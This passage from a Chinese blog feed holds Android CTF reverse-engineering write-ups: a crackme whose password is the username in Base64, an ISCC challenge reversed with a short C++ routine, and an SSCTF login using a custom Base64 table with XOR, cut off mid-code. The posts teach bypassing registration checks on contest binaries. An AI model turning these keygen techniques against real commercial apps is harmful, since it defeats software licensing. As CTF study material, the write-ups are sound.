&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005A70             loc_5A70                ;
LOAD:00005A70 01 31       ADDS            R1, #1  ; R1++，4字节每组内部循环
LOAD:00005A72             ; 96:     while ( v15 != 4 );
LOAD:00005A72 04 29       CMP             R1, #4  ; 判断是否读取完成4字节
LOAD:00005A74 F1 D1       BNE             loc_5A5A ;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;4字节取表完成后，进行计算&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005A76             ; 97:     v13 += 3;
LOAD:00005A76 07 A9       ADD             R1, SP, #0x38+buffer ; R1 = buffer //获取每组4字节数组基址
LOAD:00005A78 48 78       LDRB            R0, [R1,#1] ; R0 = buffer[1]
LOAD:00005A7A 03 37       ADDS            R7, #3  ; R7 = 0 + 3 = 3
LOAD:00005A7C             ; 98:     v11 += 4;
LOAD:00005A7C 04 33       ADDS            R3, #4  ; R3 = pPassword + 4 //定位下一组起始地址，跳4字节
LOAD:00005A7E             ; 99:     v17 = v22;
LOAD:00005A7E 02 90       STR             R0, [SP,#0x38+var_30] ; R0(buffer[1])存储到var_30
LOAD:00005A80             ; 100:     *(_BYTE *)v12 = ((signed int)v22 &amp;gt;&amp;gt; 4) | 4 * v21;
LOAD:00005A80 0C 78       LDRB            R4, [R1] ; R4 = buffer[0]
LOAD:00005A82 00 11       ASRS            R0, R0, #4 ; R0 = buffer[1] &amp;gt;&amp;gt; 4
LOAD:00005A84 A4 00       LSLS            R4, R4, #2 ; R4 = buffer[0] &amp;lt;&amp;lt; 2
LOAD:00005A86 20 43       ORRS            R0, R4  ; R0 = R0 | R4 = (buffer[0] &amp;lt;&amp;lt; 2) | (buffer[1] &amp;gt;&amp;gt; 4)
LOAD:00005A88 10 70       STRB            R0, [R2] ; new_Password[0] = (buffer[0] &amp;lt;&amp;lt; 2) | (buffer[1] &amp;gt;&amp;gt; 4)
LOAD:00005A8A             ; 101:     v18 = v23;
LOAD:00005A8A 8C 78       LDRB            R4, [R1,#2] ; R4 = buffer[2]
LOAD:00005A8C 01 94       STR             R4, [SP,#0x38+var_34] ; 将R4(buffer[2])存储到var_34
LOAD:00005A8E             ; 102:     *((_BYTE *)v12 + 1) = 16 * v17 | ((signed int)v23 &amp;gt;&amp;gt; 2);
LOAD:00005A8E A0 10       ASRS            R0, R4, #2 ; R0 = R4 &amp;gt;&amp;gt; 2
LOAD:00005A90 02 9C       LDR             R4, [SP,#0x38+var_30] ; R4 = buffer[1]
LOAD:00005A92 24 01       LSLS            R4, R4, #4 ; R4 = buffer[1] &amp;lt;&amp;lt; 4
LOAD:00005A94 02 94       STR             R4, [SP,#0x38+var_30] ; buffer[1] &amp;lt;&amp;lt; 4的结果存储到var_30
LOAD:00005A96 04 43       ORRS            R4, R0  ; R4 = R0 | R4 = (buffer[1] &amp;lt;&amp;lt; 4) | (buffer[2] &amp;gt;&amp;gt; 2)
LOAD:00005A98 54 70       STRB            R4, [R2,#1] ; new_Password[1] = (buffer[1] &amp;lt;&amp;lt; 4) | (buffer[2] &amp;gt;&amp;gt; 2)
LOAD:00005A9A             ; 103:     *((_BYTE *)v12 + 2) = (v18 &amp;lt;&amp;lt; 6) | v24;
LOAD:00005A9A 01 98       LDR             R0, [SP,#0x38+var_34] ; R0 = buffer[2]
LOAD:00005A9C C9 78       LDRB            R1, [R1,#3] ; R1 = buffer[3]
LOAD:00005A9E 84 01       LSLS            R4, R0, #6 ; R4 = buffer[2] &amp;lt;&amp;lt; 6
LOAD:00005AA0 0C 43       ORRS            R4, R1  ; R4 = R1 | R4 = (buffer[1] &amp;lt;&amp;lt; 6) | buffer[3]
LOAD:00005AA2 94 70       STRB            R4, [R2,#2] ; new_Password[2] = (buffer[1] &amp;lt;&amp;lt; 6) | buffer[3]
LOAD:00005AA4             ; 104:     v12 = (char *)v12 + 3;
LOAD:00005AA4 03 32       ADDS            R2, #3  ; 解码后的数据存储偏移加3，结合上面就是每4位计算出来变成3位
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;关键的三句，这已经是很明显的Base64解码操作了&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;new_Password[0] = (buffer[0] &amp;lt;&amp;lt; 2) | (buffer[1] &amp;gt;&amp;gt; 4)
new_Password[1] = (buffer[1] &amp;lt;&amp;lt; 4) | (buffer[2] &amp;gt;&amp;gt; 2)
new_Password[2] = (buffer[1] &amp;lt;&amp;lt; 6) | buffer[3]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;接着又进行循环操作，解码完成退出循环，进入数据的存储&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005AAC             ; 106:   v19 = (void *)operator new[](v13);
LOAD:00005AAC 38 1C       MOVS            R0, R7  ; R0 = R7 = 解码后的密码长度
LOAD:00005AAE FF F7 8E EB BLX             _Znaj   ; R0 = operator new[](strlen(new_pPassword))
LOAD:00005AB2             ; 107:   memmove(v19, v9, v13);
LOAD:00005AB2 31 1C       MOVS            R1, R6  ; src
LOAD:00005AB4 3A 1C       MOVS            R2, R7  ; n
LOAD:00005AB6 04 1C       MOVS            R4, R0  ; R4为新解码后的内存地址
LOAD:00005AB8 FF F7 A0 EB BLX             memmove ; memmove(R0, new_pPassword, R7)
LOAD:00005ABC             ; 108:   if ( v9 )
LOAD:00005ABC 00 2E       CMP             R6, #0
LOAD:00005ABE 02 D0       BEQ             loc_5AC6 ; memmove函数虽然是移动的意思，但是并不是真正的移动
LOAD:00005ABE                                     ; 所以原来的内存还是存在着数据的
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;清理一下临时空间&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005AC0             ; 109:     operator delete[]((void *)v9);
LOAD:00005AC0 30 1C       MOVS            R0, R6  ; 这里进行内存的删除操作
LOAD:00005AC2 FF F7 72 EB BLX             _ZdaPv  ; operator delete[](new_pPassword)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;再次存储数据&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005AC6             ; 110:   memcpy((void *)(v1 + 60), v19, v13);
LOAD:00005AC6
LOAD:00005AC6             loc_5AC6                ;
LOAD:00005AC6 28 1C       MOVS            R0, R5  ; R5是一个偏移基址的作用
LOAD:00005AC8 3C 30       ADDS            R0, #0x3C ; '&amp;lt;' ; R5+0x3C为最终解码数据的内存地址
LOAD:00005ACA 21 1C       MOVS            R1, R4  ; src
LOAD:00005ACC 3A 1C       MOVS            R2, R7  ; n
LOAD:00005ACE FF F7 84 EB BLX             memcpy  ; 再拷贝解码后的密码到一个结构体里
LOAD:00005AD2             ; 111:   if ( v19 )
LOAD:00005AD2 00 2C       CMP             R4, #0
LOAD:00005AD4 02 D0       BEQ             loc_5ADC
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;再清理内存&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005AD6             ; 112:     operator delete[](v19);
LOAD:00005AD6 20 1C       MOVS            R0, R4  ; void *
LOAD:00005AD8 FF F7 66 EB BLX             _ZdaPv  ; 再次进行内存的清理操作，删除解码后的密码
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最后进入一个对比函数&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005ADC             ; 113:   sub_548C(v1);
LOAD:00005ADC
LOAD:00005ADC             loc_5ADC
LOAD:00005ADC 28 1C       MOVS            R0, R5
LOAD:00005ADE FF F7 D5 FC BL              sub_548C
LOAD:00005AE2             ; 114:   return 1;
LOAD:00005AE2 01 20       MOVS            R0, #1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_548C()&lt;/code&gt;将用户名和解码后的数据进行对比&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:0000548C             sub_548C
LOAD:0000548C
LOAD:0000548C             var_1C= -0x1C
LOAD:0000548C
LOAD:0000548C F7 B5       PUSH            {R0-R2,R4-R7,LR}
LOAD:0000548E 41 6B       LDR             R1, [R0,#0x34] ; R1 = pUserName
LOAD:00005490 06 1C       MOVS            R6, R0  ; R6 = R0 = 结构体基址
LOAD:00005492 1A 4D       LDR             R5, =(_GLOBAL_OFFSET_TABLE_ - 0x54AA)
LOAD:00005494 08 1C       MOVS            R0, R1  ; R0 = R1 = pUserName
LOAD:00005496 01 91       STR             R1, [SP,#0x20+var_1C] ; 将pUserName存储到var_1C
LOAD:00005498 FF F7 92 EE BLX             strlen  ; R0 = strlen(pUserName)
LOAD:0000549C 07 1C       MOVS            R7, R0  ; R7 = R0 = 用户名长度
LOAD:0000549E 30 1C       MOVS            R0, R6  ; R0 = R6 = 结构体基址
LOAD:000054A0 3C 30       ADDS            R0, #0x3C ; '&amp;lt;' ; R0 = 解码后的数据，此处命名为pPassDecoded
LOAD:000054A2 FF F7 8E EE BLX             strlen  ; R0 = strlen(pPassDecoded)
LOAD:000054A6 7D 44       ADD             R5, PC ; _GLOBAL_OFFSET_TABLE_ ; R5 = 全局偏移表
LOAD:000054A8 00 24       MOVS            R4, #0  ; R4 = 0
LOAD:000054AA 87 42       CMP             R7, R0  ; R7 = 用户名长度，此处在判断用户名长度是否为0
LOAD:000054AC 1A D0       BEQ             loc_54E4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;循环对比&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:000054C0             loc_54C0                ;
LOAD:000054C0 01 99       LDR             R1, [SP,#0x20+var_1C] ; R1 = pUserName
LOAD:000054C2 33 19       ADDS            R3, R6, R4
LOAD:000054C4 3C 33       ADDS            R3, #0x3C ; '&amp;lt;' ; R3 = PassDecoded + i
LOAD:000054C6 0A 5D       LDRB            R2, [R1,R4] ; R2 = UserName[i]
LOAD:000054C8 1B 78       LDRB            R3, [R3] ; R3 = PassDecoded[i]
LOAD:000054CA 9A 42       CMP             R2, R3  ; 对比用户名和解码后的数据
LOAD:000054CC 09 D0       BEQ             loc_54E2 ;
LOAD:000054CC                                     ; 相等继续对比，i++
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;不相等则异常退出&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/E4F689E401208AD9A3334F644F16035D.png&quot; alt=&quot;18.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;所以整个校验逻辑就是，输入用户名以及用户名的Base64编码作为密码即可，编码后的数据需要每3位插入一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;长度也需要注意范围的校验，所以简单写个Java程序来计算即可，代码写的挫，不贴了&lt;/p&gt;

&lt;p&gt;大概就是这样&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/B136CC7246DEBE02F6A373DC928677A3.png&quot; alt=&quot;19.png&quot; /&gt;&lt;/p&gt;
</description>
                <pubDate>Mon, 04 Sep 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/09/04/2014-NAGA&PIOWIND-APP%E5%BA%94%E7%94%A8%E6%94%BB%E9%98%B2%E7%AB%9E%E8%B5%9B-crackme.l1.sign.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/09/04/2014-NAGA&PIOWIND-APP%E5%BA%94%E7%94%A8%E6%94%BB%E9%98%B2%E7%AB%9E%E8%B5%9B-crackme.l1.sign.html</guid>
            </item>
        
            <item>
                <title>2017 ISCC全国大学生信息安全与对抗技术竞赛 - 简单到不行-100</title>
                <description>&lt;p&gt;后天物理考试，打场CTF放松一下&lt;/p&gt;

&lt;p&gt;题目说了是送分题，应该是送分的，非常传统的套路，Java层获取一个RegCode，然后传入native层进行校验&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/6E3AAB45FDF15B58E85DF398FADEA8E5.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;native层的校验，遍历前一半的数据，每一个加5，然后跟对称的数据进行交换&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/3BB5905CB500A0D02866C95ABC6C0B7F.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;那么我们还原的代码就是从后面开始遍历，遍历后一半，然后跟对称的数据进行交换&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;cstdio&amp;gt;
#include &amp;lt;cstring&amp;gt;
using namespace std;

int main()
{
	char Key[] = &quot;=0HWYl1SE5UQWFfN?I+PEo.UcshU&quot;;
	int len = strlen(Key);
	for(int i = len - 1; i &amp;gt;= len / 2; i--)
	{
		Key[i] += 5;
		int temp = Key[len - i - 1];
		Key[len - i - 1] = Key[i];
		Key[i] = temp;
	}
	printf(&quot;%s\n&quot;, Key);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;结果&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ZmxhZ3tJU0NDSkFWQU5ES1lYWH0=
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这很明显的是Base64处理过的，拿去还原&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;flag{ISCCJAVANDKYXX}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;需要注意一下，这题使用了动态注册，使用F5的时候，有些怪怪的，直接找关键的代码就行&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/AD5C2A22597102E60780E8CB3F3C12F7.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;跟进去，可以看到动态注册的函数调用，双击过去就是待注册函数表&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/921F1C0E87F0D75F67DC79678D3D1BF6.png&quot; alt=&quot;4.png&quot; /&gt;&lt;/p&gt;
</description>
                <pubDate>Thu, 01 Jun 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/06/01/2017-ISCC%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%8E%E5%AF%B9%E6%8A%97%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E7%AE%80%E5%8D%95%E5%88%B0%E4%B8%8D%E8%A1%8C-100.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/06/01/2017-ISCC%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%8E%E5%AF%B9%E6%8A%97%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E7%AE%80%E5%8D%95%E5%88%B0%E4%B8%8D%E8%A1%8C-100.html</guid>
            </item>
        
            <item>
                <title>2017 SSCTF - Login-200</title>
                <description>&lt;p&gt;感谢沐师傅在赛后提供题目&lt;/p&gt;

&lt;p&gt;Java层上了一堆中文变量。。。。。。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/1019417FCF9B019A1DECC419EECC2F92.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在一顿修复之后，大概的能梳理出校验过程&lt;/p&gt;

&lt;p&gt;校验的地方&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/62F60092EE0C81454FF20A55DCA4195C.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;一层一层分析，这是一个native函数，需要使用IDA分析&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;JniTest.getValue(strInput.getBytes(&quot;utf-8&quot;))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;使用IDA载入对应的so文件，有一个关键的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;encode()&lt;/code&gt;函数&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/A61E0D433FE59E7FC88581E728FD60CA.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;跟入发现白茫茫一片&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/9876CC278F2DBB3AAD2D4BEE6BCFB69D.png&quot; alt=&quot;4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;使用流程图查看，发现调用关系断开&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/38DE0DE170EB153E42ABBCCCED27A26D.png&quot; alt=&quot;5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;先去掉下面这个块的函数尾&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:000025CC ; START OF FUNCTION CHUNK FOR encode
.text:000025CC CODE16
.text:000025CC
.text:000025CC loc_25CC
.text:000025CC BX      PC
.text:000025CC ; END OF FUNCTION CHUNK FOR 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Force BL Call&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;即可修复，F5之后的代码也比较正常可读&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/0E6AFE4B8CA8B6BD244E34EBEC3891FD.png&quot; alt=&quot;6.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;伪代码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/09FCF618B7CCFD8DA42A951E9D147B44.png&quot; alt=&quot;7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;入口处看到了长度由12变为16位，也就是三位扩充成4位，猜测是Base64算法&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if ( v4 )
    dwDivideJudge = j_j___divsi3(_lenOfbaRegCode, 3) + 1;
else
    dwDivideJudge = j_j___divsi3(_lenOfbaRegCode, 3);// Java层注册码要求12位
lpStringBuffer = j_j_malloc(4 * dwDivideJudge);// 长度由12位扩充为16位
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;找到一个转换表&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/06F5CF24544521871B10D811F3AFA941.png&quot; alt=&quot;8.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;使用WinHex找到对应偏移，C Source模式拷贝出来&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unsigned char data[66] = {
    0x21, 0x3A, 0x23, 0x24, 0x25, 0x26, 0x28, 0x29, 0x2B, 0x2D, 0x2A, 0x2F, 0x60, 0x7E, 0x5F, 0x5B, 
    0x5D, 0x7B, 0x7D, 0x3F, 0x3C, 0x3E, 0x2C, 0x2E, 0x40, 0x5E, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 
    0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 
    0x77, 0x78, 0x79, 0x7A, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x5C, 0x27, 
    0x3B, 0x00
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;IDA里没显示完全，其实应该是下面这样的&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!:#$%&amp;amp;()+-*/`~_[]{}?&amp;lt;&amp;gt;,.@^abcdefghijklmnopqrstuvwxyz0123456789\'; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;正常的Base64编码表如下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;所以在这里写还原代码的时候不能使用下面这种常规编码表的方式&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static char Base64Table[256] = {
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 0   - 15
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 16  - 31
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, // 32  - 47
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1, // 48  - 63
    -1,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, // 64  - 79
    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, // 80  - 95
    -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, // 96  - 111
    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1, // 112 - 127
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 128 - 143
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 144 - 159
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 160 - 175
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 176 - 191
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 192 - 207
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 208 - 223
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 224 - 239
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 240 - 255
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;而是根据对应的char来查找index，然后拼接到一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int&lt;/code&gt;型数据里去，由于编码表是变形的，所以只能使用循环来查找&lt;/p&gt;

&lt;p&gt;这里我放一份比较常规的Base64编码的C语言实现，可以跟反编译后的代码进行对比&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;const char Base64Code[] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;

void Base64_encode(char *lpString)
{
    char *lpBuffer;
    int lpString_len = strlen(lpString);
    while(lpString_len &amp;gt; 0)
    {
        *lpBuffer++ = Base64Code[(lpString[0] &amp;gt;&amp;gt; 2 ) &amp;amp; 0x3F];
        if(lpString_len &amp;gt; 2)
        {
            *lpBuffer++ = Base64Code[((lpString[0] &amp;amp; 3) &amp;lt;&amp;lt; 4) | (lpString[1] &amp;gt;&amp;gt; 4)];
            *lpBuffer++ = Base64Code[((lpString[1] &amp;amp; 0xF) &amp;lt;&amp;lt; 2) | (lpString[2] &amp;gt;&amp;gt; 6)];
            *lpBuffer++ = Base64Code[lpString[2] &amp;amp; 0x3F];
        }
        else
        {
            switch(lpString_len)
            {
            case 1:
                *lpBuffer ++ = Base64Code[(lpString[0] &amp;amp; 3) &amp;lt;&amp;lt; 4 ];
                *lpBuffer ++ = '=';
                *lpBuffer ++ = '=';
                break;
            case 2:
                *lpBuffer ++ = Base64Code[((lpString[0] &amp;amp; 3) &amp;lt;&amp;lt; 4) | (lpString[1] &amp;gt;&amp;gt; 4)];
                *lpBuffer ++ = Base64Code[((lpString[1] &amp;amp; 0x0F) &amp;lt;&amp;lt; 2) | (lpString[2] &amp;gt;&amp;gt; 6)];
                *lpBuffer ++ = '=';
                break;
            }
        }
        lpString += 3;
        lpString_len -= 3;
    }
    *lpBuffer = '\0';
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Base64编码基于的一个原理就是6位&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;01&lt;/code&gt;即可表示64个不同的字符在取第一个字符的时候，只需要取前6位，转为index，找到编码表对应的字符即可，但是这里的算法还进行了一次异或，所以最终的编码在计算的时候，需要把每4个字节的第一个字节跟&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x3F&lt;/code&gt;进行异或，再去找对应的字符下标index&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; *lpStringBuffer_chBy4b = a__Abcdefghijkl[temp &amp;gt;&amp;gt; 2] ^ 0x3F;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第二字节同样做了异或操作&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lpStringBuffer_chBy4b[1] = *(&amp;amp;a__Abcdefghijkl[16 * temp &amp;amp; 0x3F] + (j &amp;gt;&amp;gt; 4)) ^ 0xF;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第三和第四字节常规的编码，没有其余操作&lt;/p&gt;

&lt;p&gt;结合输入的注册码为12位，那么我们还原的代码如下，对于后面的判断我就省略了&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public class MyClass {
	
	static byte[] dataEncoded = {0x01, 0x63, 0x5e, 0x6c, 0x5f, 0x23, 0x78, 0x25, 0x5f, 0x27, 0x35, 0x6c, 0x11, 0x66, 0x31, 0x65};
	
	static byte[] Base64Table = {
		    0x21, 0x3A, 0x23, 0x24, 0x25, 0x26, 0x28, 0x29, 0x2B, 0x2D, 0x2A, 0x2F, 0x60, 0x7E, 0x5F, 0x5B, 
		    0x5D, 0x7B, 0x7D, 0x3F, 0x3C, 0x3E, 0x2C, 0x2E, 0x40, 0x5E, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 
